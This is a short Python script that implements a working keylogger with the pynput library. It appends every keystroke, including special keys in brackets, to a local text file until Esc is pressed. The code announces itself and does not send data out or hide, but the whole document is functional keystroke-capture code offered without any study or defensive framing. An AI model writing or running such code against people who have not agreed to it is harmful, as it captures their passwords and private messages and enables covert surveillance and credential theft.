from pynput.keyboard import Key, Listener

# Define the file to store the keystrokes
log_file = "keystrokes_log.txt"

def on_press(key):
    try:
        # Write the pressed key to the log file
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Special keys (e.g., Shift, Ctrl) don't have a char attribute
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write("[" + str(key) + "]")

def on_release(key):
    # Stop the listener when Esc key is pressed
    if key == Key.esc:
        return False

def main():
    print("Keylogger started. Press Esc to stop.")
    # Start the listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
